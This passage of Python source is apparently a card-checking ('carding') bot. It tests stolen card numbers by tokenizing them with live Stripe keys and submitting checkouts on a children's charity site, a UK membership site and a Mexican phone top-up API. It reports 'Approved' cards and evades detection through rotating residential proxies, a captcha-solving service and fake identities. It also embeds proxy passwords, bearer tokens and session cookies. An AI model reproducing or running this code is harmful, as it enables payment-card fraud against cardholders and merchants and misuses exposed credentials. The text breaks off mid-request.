                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

            data = f'guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd&sid=36a4a8fe-b091-45e5-8412-81345f30407463f885&referrer=https%3A%2F%2Fwww.children.org&time_on_page=415337&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&payment_user_agent=stripe.js%2Fbf449b81e7%3B+stripe-js-v3%2Fbf449b81e7%3B+split-card-element&pasted_fields=number&key=pk_live_51HgrtnHhxqq5H7ZZwjXhFZJ6zBol49y4PFaEvjAdxnBm8lbKIjrAwoGXsJ8lYS9oa2ZzHgDpxe1vHWca6V8y8SMI00NLIdGZFr'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            token = responsePm['id']
            headers = {
                    'authority': 'www.children.org',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; engagementcount=2; gtm_page_view=3; pid=; BNES_pid=; Cookie - Page Count=3; _clsk=1oxk4sc%7C1741984796608%7C3%7C1%7Ci.clarity.ms%2Fcollect; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984798402|3|1|bat.bing.com/p/insights/c/i; FPGSID=1.1741984694.1741985020.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; EPi_NumberOfVisits=23,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55,2025-03-14T20:39:55,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:43:45,2025-03-14T20:44:08; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741985047.60.0.0; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741985047.0.0.950301738',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/checkout',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

            json_data = {
                    'Details': {
                        'address': {
                            'countryId': '148',
                            'zipCode': '97910',
                            'stateProvinceId': '96',
                            'address1': 'calle o242',
                            'address2': '',
                            'city': 'Teabo',
                            'stateProvince': 'YU',
                        },
                        'email': email,
                        'title': 'Mr.',
                        'firstName': name,
                        'lastName': last,
                        'phone': '9971556986',
                        'cellPhone': '5523699869',
                        'allowMobile': '',
                        'acceptedGDPR': False,
                        'gdprVersion': 0,
                        'allowEmail': '',
                        'currentCountry': {
                            'countryId': 148,
                            'countryAbbr': 'MX',
                            'displayName': 'Mexico',
                            'isPostalAware': True,
                        },
                        'currentState': {
                            'stateProvinceId': 96,
                            'stateProvinceAbbr': 'YU',
                            'displayName': 'Yucatan',
                            'countryId': 148,
                        },
                        'requiresAddressValidation': False,
                        'addressConfirmed': True,
                        'validAddress': True,
                    },
                    'CreditCardInfo': {
                        'cardType': 'MasterCard',
                        'lastFour': '5931',
                        'expirationMonth': mes,
                        'expirationYear': ano_number,
                        'cardNumber': token,
                        'nameOnCard': name+' '+last,
                        'saveCard': True,
                        'token': token,
                    },
                }

            responseChk = c.post('https://www.children.org/api/checkout',  headers=headers, json=json_data)
            soup = b(responseChk.text, 'html.parser')
            response_text = responseChk.text

                # Intentar parsear como JSON
            try:
                    response_data = json.loads(response_text)
                    
                    # Comprobar si hay errores
                    if response_data.get("HasErrors"):
                        # Si hay errores, obtener la lista de errores
                        errors = response_data.get("Errors", [])
                        if errors:
                            # Si hay errores, imprimir el primer error
                            print(f"Error: {errors[0]}")
                            return errors[0]
                        else:
                            print("Error desconocido.")
                            errordes="Error desconocido."
                            return errordes
                    else:
                        # Si no hay errores, verificar si el pago fue exitoso
                        if response_data.get("LineItems") and response_data["LineItems"][0].get("Paid"):
                            print("Approved.")
                            live="Approved."
                            return live
                        else:
                            print("Estado del pago desconocido.")
                            pagodes="Estado del pago desconocido."
                            return pagodes
                            
            except json.JSONDecodeError:
                    # Si no es JSON, intentamos parsear el HTML
                    soup = b(response_text, 'html.parser')
                    # Aquí puedes buscar algún mensaje de error específico en el HTML, por ejemplo:
                    error_message = soup.find('div', class_='error-message')
                    if error_message:
                        print(f"Error: {error_message.text.strip()}")
                    else:
                        print("No se pudo encontrar un mensaje de error.")


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


async def authstripe(card: str) -> str:
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c = requests.Session()

            usuariop = "RNET79906_Quituk-zone-resi-asn-AS11351"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }


            # Desactivar la verificación SSL (equivalente al -k de curl)
            c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                # 'Cookie': 'PHPSESSID=vp5j2udrtro2tpp2g70vnu0vjd; pmpro_visit=1; _referrer=www.google.com; __stripe_mid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7; __stripe_sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e',
                'Pragma': 'no-cache',
                'Referer': 'https://vessel.org.uk/membership-account/membership-levels/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'level': '3',
            }

            response = c.get(
                'https://vessel.org.uk/membership-account/membership-checkout/',
                params=params,
                headers=headers,
            )
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7&sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e&pasted_fields=number&payment_user_agent=stripe.js%2F4d9faf87d7%3B+stripe-js-v3%2F4d9faf87d7%3B+split-card-element&referrer=https%3A%2F%2Fvessel.org.uk&time_on_page=153933&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GOmfMA0gzfoyzxJ&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiTnBiamhTRzBIOW5Bc05DbEVuY2VVVVFlUlV4NmdyVkNQUmZOWTk5Z25SVlQ4dEhGUUQrNnZZc3BoV0g4SVcrdkZJRlVBM3pjZkh4cHV2R1hHcXI0MlNaQWdNL0g2THMvZzFTSGlrSTljbnZ3QTBsTDNSVVlVWnZVeVZPbmM3eFhHUnpySXBxNmZoQlBzTk52QUhTU2lGVWRzYW50RnYxQTgrbDlmQnNub1FBalJsM3lkTmQ0SjB4Zkt2S2RibXVCamsrNENoc1h3Um81MHlCVERWUTgrOWE1UWN6SjJPZ09zZ2Q5V2p4OUlyRzlxRk9Mc2RwTVVUTHdiTUI2TzIyVC84STdjd0lpczM5bmNjTFBCK2RtWGN0Vm1UREZLbUR1L3F2SW1CTzc3WjV0eGo3SENZSllDeDYrak5IVEdPNUp5eEthNGpvUnhqMjdyd1l1SlNVYk1kSWxiSVhkMWt6akVQYXk4ZXo1ZFZlNi9sZ0ltYk5CdldQUXhCbzdlVVJrVW95aHRmR2ZjWndEdnNUcnNqb2hWNC9ZZkp4MVhiRVpZT01lZGE3N2cwd2xYRjNuVEtPckFRUVBDUkJlWmtTcWxzMEo4L2pLYmppUmlBcWp6L1hDRXp6STU5TFc4ZUluSkVGVDBwTmc1SWdRNjlQV2lnMVFWYStndUw2QVVETk5ubFZJL0pJelJKbjNISTZtOWlZZWJ2aWt5eEhVb0xib3NpcUhWUHJ0WU1udUgzOXVkNUhZU0tsQzE5bXhRU1ViUFV4VkNnWHA0aTJCYUZ3MW01TEhYTFVaMFVZNS92dU1TMGFlQW41NGFFUDAyeVpTVWdTRWI5czkvOFcxKzcwemNLRW43VHNjZ1hSb1NBVjV2dmZKZWJONFJHZ1ZiOTc3QllTT1QwYTVKeGdSM0hYSmM0WXNpakwxaExhSUoxbWpFbGZlUm1uRjZKSm0zOHk5a2xXWERWZStuaDhHaDJBMVluSWlpTWJvR3dWUFhib2N1ZFo2OUR1ZnlOczZ4eGNmM0paNUh2SjdYb09YREtmZVF3Y3BtTFlNZVdNWkR5TG5iWmRLS0h6TDBEcGI3WWQ1N3FZb05SRDFoOWYzQ3BzSHZLRUJxY05hSDM2ZGZJY1paTlJNS05rWkdqM3g1ZGFQSmE0Q1pPUG5kSDdIamZlSnVrTmdCUE5ubXVQdExOSkRQbWpUeXZzZEVWMlpGSGlKaXNJTFNmMW1JWTZ1QTN3cmNuNE9NdHJJNVUraXlWcEt6aGFuVUhGRXE4cldMam90Z0NkSkZzRWlJQWZVQUVyRUhHemtENXlGVW1oNUdVUGdJYTRsSU1wcmFZdmFVZll6cmhSZlV1Zzhqb2J4UGxsenhjdDNjNkd6YWloRmNYQldUZnQ4V2txNXpsSHRMdkxWRDFMOVhNYm9nS1N2bmNHb1puVEZ4czRTQXA4RVExQ2ZqUktndVhVeVA2eDRtUnRqV2RjWGNUOW5BVWdBQmZvVm1lazZPc2JwMEpWSWtqaEpKYjc2V1BHT1RqbmNnZTJ4ZHFBRmZxUzhrbEJaeDZtekpKMUxpb0lGWGhKZ1kvZkg0bC9CZFZoQWVhZHozZmNObnVvNFBJWG5sVUpndzJ0WStGMmlGUDNtWk1xUDl1NG01OThVNUZXSHVmSHdGOUplN08yVU1nbFJMWEhIaWlPTE1XUUdQc25kQ0R5ZXdOdlNMRHlsVlhxZGIxNzZxR3pyMVk2WW5hSDdZRllOUHd2M1c3eUZrelJ4aFppRlFxalpLM1hkK1VJRG8vL0M3YmMwTU91ZDFnZlZzS3kxWGNqYkVacGdEdkVjeWZ5U3VBRFhTNmJrYnNlM1hmZ1ZWRC9ZK1JjOTczOHZ2R01RL25kRWV0NHI0S3dKWGFHM0hka3FTckhQUXhGREZoVXFvRDhhV25DenU0Z3ZkdTRMMmczZ0txd25TTmZUWkI4ckV2d0ViUDZSRHd1WGZCSTNLNVRHcWFiSXRvMFU2amVyckRJMmZndEJFSFJkYVZNYWh2SmZoM3FZYUttVzQ3MzkveFR6VkJtVEphRVpNL3lmTTQvQkJudDRlM21vbHhNVVZRUHdDbmp5cmNHTW44SGxCcXN0aTlHR0xGemxJM1owVEwza0hsZjArdmw0UHJ5OTVIdTJVeTdIamMvOU5IS0ZJd2ZDRHEzdlNCZ1d1YUNqMEpMaEVGY015R1RJZTh2a2NSVm42S25BVDk0NGFnOVprUVcyVWl0UDJ6M1VhdjdoeVhYd1c0L0l6QXhyREVXb1BHMk9uWTVyQUpNSXRnQ1pmbjNSNlJiSEdna0M5NlFBRnZLK0drV2s4TDlmRDdBTUZVM25ZQi9TNUdoQk5XL3l4REpQS1dsYXZUT3E3MVpQYkFHLzlzZUkxTEduNlhYcUtkdjIyYzV4c1c2WUdVRmc2d01QNDVyZTNvSCtuVHFpKzlsb0pDTXZnK2RvRGRXc25TbC8yb1VRRWE0Y3J0OXRsM0pUYWd1MDdwUnlobWdzK0RmQWJWMWE4UlgzUm94U3BzUS9SLzZvQktGR245Rmc0RW9namxHYkR2NmxkaHVjKzdQNkRXSDFaVHJxaStQcXZYVzJGdlhxZlZ4LzA5SGVsYkVqRERJdDNPbnNBT0I3ZnN3OGVVTGltc3JqZFBwdG1tSXBBOW45emVyb1JMcktqU2lnK2Z1VGZjN3V3dTEraVR1dFZURTdiR1MwaDZQYUI1cWZVa0pobU5LRHFuVkpTbmFwSzV6T09RQzdTMkxCTmtWTjJrdHMzZThOLzA1S05hNkZuUlVEZFhkT0dVeVJyK0RpdkVZOGttV3o2K1BTcVRCZWtoMitnQT09IiwiZXhwIjoxNzQzOTY5MDgzLCJzaGFyZF9pZCI6MjIxOTk2MDczLCJrciI6IjFkMzhlN2Q2IiwicGQiOjAsImNkYXRhIjoiTWg1ZHQvK3NBVXEyWDhQMEl0RkxqUkpLZ0Yrd1c1YUxoSTcwN2ZFTzdwY1krM1RGSWJLNU5hSmwrOWNSTDJOZ2Q2TWwvV3RMUjZlRThXUklVWlRNaTQ1eXlDakVoZzFwUWNhZy91cm5jWmRxU2xiRENST3k5NUI4Q1g1VDluRzlrUDZ1aWtCU0Y5SnZZTG5URVJUT2xSa2Q4Wlp0ajRWTnNKdGNJU0tNMW9qM2ZrK1JTZHpUUXNKR1dFSjA2K0R0VTZCOTh1THhnY25TUkNqaCJ9.e23hdvzWamiln90psFDzuyFjXTfu6bHdDBIFKVee8rw'

            response = c.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenstr = responsePm['id']

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                # 'Cookie': 'PHPSESSID=vp5j2udrtro2tpp2g70vnu0vjd; pmpro_visit=1; _referrer=www.google.com; __stripe_mid=1853803e-5539-4c32-a21f-8a3e4f5dc0a4f235c7; __stripe_sid=4fcff449-d3a0-4cca-ba72-59e46a02128cc3d31e',
                'Origin': 'https://vessel.org.uk',
                'Pragma': 'no-cache',
                'Referer': 'https://vessel.org.uk/membership-account/membership-checkout/?level=3',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'level': '3',
            }

            data = {
                'level': '3',
                'checkjavascript': '1',
                'username': 'dljwwsk'+name+last,
                'password': 'Saiper123',
                'password2': 'Saiper123',
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': 'mastercard',
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': tokenstr,
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
            }

            responseChk = c.post(
                'https://vessel.org.uk/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                data=data,
            )

            
            try:
                # Primer response con posible error
                soup = b(responseChk.text, 'html.parser')
                div_element = soup.select_one('div#pmpro_message.pmpro_message.pmpro_error')

                if div_element:
                    return(f"❌ Error: {div_element.text.strip()}")
                else:
                    # Si no hay error, hacemos la siguiente petición para confirmar membresía
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'es-ES,es;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'Pragma': 'no-cache',
                        'Referer': 'https://vessel.org.uk/membership-account/membership-checkout/?level=3',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }

                    params = {
                        'level': '3',
                    }

                    response_confirm = c.get(
                        'https://vessel.org.uk/membership-account/membership-confirmation/',
                        params=params,
                        headers=headers,
                    )

                    soup_confirm = b(response_confirm.text, 'html.parser')
                    title_tag = soup_confirm.find('title')

                    if title_tag and "Membership Confirmation" in title_tag.text:
                        return("✅ Approved")
                    else:
                        return("⚠️ No se encontró mensaje de error ni confirmación.")

            except Exception as e:
                return(f"❗ Ocurrió un error inesperado: {e}")
           
        


            
            
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}

async def tec(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            numeros_disponibles = [
                "5635116853", "5635161652", "5635117040", "5635117578", "5635119868", "5635120199"
            ]
            elegido = random.choice(numeros_disponibles)
            print(elegido)
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': elegido,
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan_services/validate', params=params, headers=headers)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['altan_service']['id']
            print(id_servicio)
            time.sleep(2)
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'segment_id': '1',
                'altanServiceId': '109896',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
                'altan_speed_limit': 'best_effort',
                'service_offer_type': 'primary',
                'offering_type': 'top_up',
                'is_multiple_activation': 'true',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)
            time.sleep(2)

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/116.0.0.0 Safari/537.36'
                ),
            }

            data = (
                'time_on_page=259834'
                '&pasted_fields=number'
                '&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5'
                '&muid=d51c4248-1542-438c-a89e-99aa38930d3670a15d'
                '&sid=25c34fde-e457-4fb4-bcfc-a35c038a4cc5546441'
                '&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC'
                '&payment_user_agent=stripe.js%2F78ef418'
                f'&card[number]={cc_number}'
                f'&card[cvc]={cvv}'
                f'&card[exp_month]={mes}'
                f'&card[exp_year]={ano_number}'
            )

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
